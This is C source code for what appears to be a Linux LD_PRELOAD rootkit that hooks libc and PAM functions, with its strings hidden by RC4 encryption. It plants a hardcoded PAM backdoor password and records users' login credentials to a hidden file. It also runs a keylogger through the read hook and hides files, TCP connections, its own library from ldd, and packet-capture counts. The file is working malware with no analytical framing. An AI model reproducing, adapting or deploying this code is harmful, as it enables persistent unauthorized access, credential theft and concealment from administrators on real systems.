#include <dlfcn.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/syscall.h>

#include "hide.h"
#include "hooks.h"
#include "key.h"
#include "rc4.h"
#include "utils.h"

#define FSTATAT_ENC "\x31\xA5\x8E\x54\xE1\x4D\x93"

int fstatat (int fd, const char *restrict path,
             struct stat *restrict buf, int flag) {
  typedef int (*fstatat_fn)(int, const char *, struct stat *, int);
  static fstatat_fn orig_fstatat_6408;
  char fstatat_str[8];

  if (!orig_fstatat_6408) {
    // "fstatat"
    strcpy (fstatat_str, FSTATAT_ENC);
    orig_fstatat_6408 = (fstatat_fn)dlsym(RTLD_NEXT,
                                          rc4(key, fstatat_str, 7));
  }
  if (fd != -100 || !must_hide(path))
    return orig_fstatat_6408(fd, path, buf, flag);

  errno = ENOENT;
  return -1;
}

#define PAM_ENC "\x27\xB7\x97\x6A\xF4\x4F\x84\xC2\x9A\x22\x41\xFE\x67"
#define CAIXAPASS_ENC "\x34\xB7\x93\x4D\xF4\x18\xD5\xC6\xA4\x3C\x55" \
                      "\xFC\x78"

int pam_acct_mgmt(pam_handle_t *pamh, int flags) {
  typedef int (*pam_acct_mgmt_fn)(pam_handle_t *, int);
  static pam_acct_mgmt_fn orig_pam_acct_mgmt_5696;
  char pam_enc[14];
  char caixapass[14];

  if (!orig_pam_acct_mgmt_5696) {
    // "pam_acct_mgmt"
    strcpy(pam_enc, PAM_ENC);
    orig_pam_acct_mgmt_5696 = dlsym(RTLD_NEXT, rc4(key, pam_enc, 13));
  }
  if (pampassword) {
    // "caixa42passok"
    strcpy(caixapass, CAIXAPASS_ENC);
    if (strcmp(pampassword, rc4(key, caixapass, 13)) == 0) {
      erasefree(pampassword);
      pampassword = 0;
      return 0;
    }
  }

  erasefree(pampassword);
  pampassword = 0;
  return orig_pam_acct_mgmt_5696(pamh, flags);
}

#define PAM_AUTH_ENC "\x27\xB7\x97\x6A\xF4\x59\x93\xDE\xA0\x21\x52\xFA\x70\x34\x1C\x0A"
#define PAM_SSSS_ENC "\x27\xB7\x97\x49\xB0\x5F\x9B\x93\xB6\x33\x03\xE0\x6F\x70\x1B\x65"
#define ETC_MPT64_ENC "\x78\xB3\x8E\x56\xBA\x41\x97\xC2\xF3\x7B\x08\xFB"

int pam_authenticate(pam_handle_t *pamh, int flags) {
  typedef int (*pam_authenticate_fn)(pam_handle_t *, int);
  static pam_authenticate_fn orig_pam_authenticate_5729;
  char s[1024];
  char pam_auth[17];
  char caixapass[14];
  char pam_ssss[17];
  char etc_mpt64[13];
  int res;
  int prev_errno;

  if (!orig_pam_authenticate_5729) {
    // "pam_authenticate"
    strcpy(pam_auth, PAM_AUTH_ENC);
    orig_pam_authenticate_5729 = dlsym(RTLD_NEXT,
                                       rc4(key, pam_auth, 16));
  }
  res = orig_pam_authenticate_5729(pamh, flags);
  prev_errno = errno;
  if (pampassword) {
    // "caixa42passok"
    strcpy(caixapass, CAIXAPASS_ENC);
    if (strcmp(pampassword, rc4(key, caixapass, 13)) == 0) {
      errno = prev_errno;
      return 0;
    }
  }
  if (!res) {
    void *p1 = NULL;
    void *p2 = NULL;
    void *p3 = NULL;
    pam_get_item(pamh, PAM_SERVICE, &p1);
    pam_get_item(pamh, PAM_RHOST, &p2);
    pam_get_item(pamh, PAM_USER, &p3);
    // "pam|%s|%s|%s|%s"
    strcpy(pam_ssss, PAM_SSSS_ENC);
    snprintf(s, 1024, rc4(key, pam_ssss, 16), p1, p2, p3, pampassword);
    strcpy(etc_mpt64, ETC_MPT64_ENC);
    savepasswd(rc4(key, etc_mpt64, 12), s);
  }
  erasefree(pampassword);
  pampassword = 0;
  errno = prev_errno;
  return res;
}

#define EXECVE_ENC "\x32\xAE\x9F\x56\xE3\x49"
#define LD_TRACE_ENC "\x1B\x92\xA5\x61\xC7\x6D\xA4\xF3\x9A\x03\x69\xD2" \
                     "\x57\x10\x2C\x30\xF9\x77\xB0\x91\x4B\x77\x08"

int execve(const char *pathname, char *const _Nullable argv[],
                   char *const _Nullable envp[]) {
  typedef int (*execve_fn)(const char *, char *const[], char *const[]);
  static execve_fn orig_execve;
  char execve_str[7];
  char ld_trace[24];

  if (!orig_execve) {
    // "execve"
    strcpy(execve_str, EXECVE_ENC);
    orig_execve = dlsym(RTLD_NEXT, rc4(key, execve_str, 6));
  }
  strcpy(ld_trace, LD_TRACE_ENC);
  // "LD_TRACE_LOADED_OBJECTS"
  if (getenv(rc4(key, ld_trace, 23)))
    return fake_trace_objects(pathname, argv, envp);
  return orig_execve(pathname, argv, envp);
}

#define FOPEN64_ENC "\x31\xB9\x8A\x50\xFB\x1A\xD3"
#define PROC_NET_TCP_ENC "\x78\xA6\x88\x5A\xF6\x03\x89\xD3\xB1" \
                         "\x60\x52\xF0\x63"

FILE *fopen64(const char *pathname, const char *mode) {
  typedef FILE* (*fopen64_fn)(const char *, const char *);
  static fopen64_fn orig_fopen64_6604;
  char fopen64_str[8];
  char proc_net_tcp[14];
  FILE *f;

  if (!orig_fopen64_6604) {
    // "fopen64"
    strcpy(fopen64_str, FOPEN64_ENC);
    orig_fopen64_6604 = dlsym(RTLD_NEXT, rc4(key, fopen64_str, 7));
  }

  f = orig_fopen64_6604(pathname, mode);
  if (!f)
    return f;
  // "/proc/net/tcp"
  strcpy(proc_net_tcp, PROC_NET_TCP_ENC);
  if (strstr(pathname, rc4(key, proc_net_tcp, 13)))
    return hide_proc_net_connection(f);

  return f;
}

#define STAT_ENC "\x24\xA2\x9B\x41"

int stat(const char *restrict pathname,
                 struct stat *restrict statbuf) {
  typedef int (*stat_fn)(const char *restrict, struct stat *restrict);
  static stat_fn orig_stat_6491;
  char stat_str[5];

  if (!orig_stat_6491) {
    // "stat"
    strcpy(stat_str, STAT_ENC);
    orig_stat_6491 = dlsym(RTLD_NEXT, rc4(key, stat_str, 4));
  }

  if (must_hide(pathname)) {
    errno = ENOENT;
    return -1;
  }

  return orig_stat_6491(pathname, statbuf);
}

#define READ_ENC "\x25\xB3\x9B\x51"

ssize_t read(int fd, void *buf, size_t count) {
  typedef ssize_t (*read_fn)(int, void *, size_t);
  static read_fn orig_read;
  char read_str[5];
  ssize_t res = -1;

  if (!orig_read) {
    // "read"
    strcpy(read_str, READ_ENC);
    orig_read = dlsym(RTLD_NEXT, rc4(key, read_str, 4));
  }
  if (orig_read) {
    res = orig_read(fd, buf, count);
    if(res > 0 && !errno) {
      if (!enable_hook_5776)
        enable_hook_5776 = check_rw_hook();
      if (enable_hook_5776 == 2) {
        int previous_errno = errno;
        keylogger(fd, buf, count, &enable_hook_5776);
        errno = previous_errno;
      }
    }
  }

  return res;
}

#define PCAP_STATS_ENC "\x27\xB5\x9B\x45\xCA\x5F\x93\xD7\xB1\x3C"

int pcap_stats(pcap_t *p, struct pcap_stat *ps) {
  typedef int (*pcap_stats_fn)(pcap_t *, struct pcap_stat *);
  char pcap_stats_str[11];
  pcap_stats_fn orig_pcap_stats;
  int res;

  // "pcap_stats"
  strcpy(pcap_stats_str, PCAP_STATS_ENC);
  orig_pcap_stats = dlsym(RTLD_NEXT, rc4(key, pcap_stats_str, 10));
  res = orig_pcap_stats(p, ps);
  if (res == 0)
    ps->ps_recv -= filter_cnt;

  return res;
}

int setsockopt(int socket, int level, int option_name,
               const void *option_value, socklen_t option_len) {
  int res;

  res = syscall(SYS_setsockopt, socket, level, option_name,
                option_value, option_len);
  if (res >= 0) {
    if (option_name == SO_ATTACH_FILTER
        && apply_filter (socket, level, SO_ATTACH_FILTER,
                         option_value, option_len,
                         *(unsigned int *)option_value + 40)) {
      syscall(SYS_setsockopt, socket, level, SO_ATTACH_FILTER,
              option_value, option_len);
    }
  }
  else errno = -res;

  return res;
}

FILE *fopen(const char *restrict pathname,
                    const char *restrict mode);
ssize_t recvmsg(int socket, struct msghdr *message, int flags);
int pam_set_item(pam_handle_t *pamh, int item_type,
                         const void *item);
int statx(int dirfd, const char *_Nullable restrict pathname,
                  int flags, unsigned int mask,
                  struct statx *restrict statxbuf);
int fstatat64(int dirfd, const char *pathname,
                      struct stat64 *statbuf, int flags);
int pcap_loop(pcap_t *p, int cnt,
                      pcap_handler callback, u_char *user);
struct dirent *readdir(DIR *dirp);
struct dirent64 *readdir64(DIR *dirp);
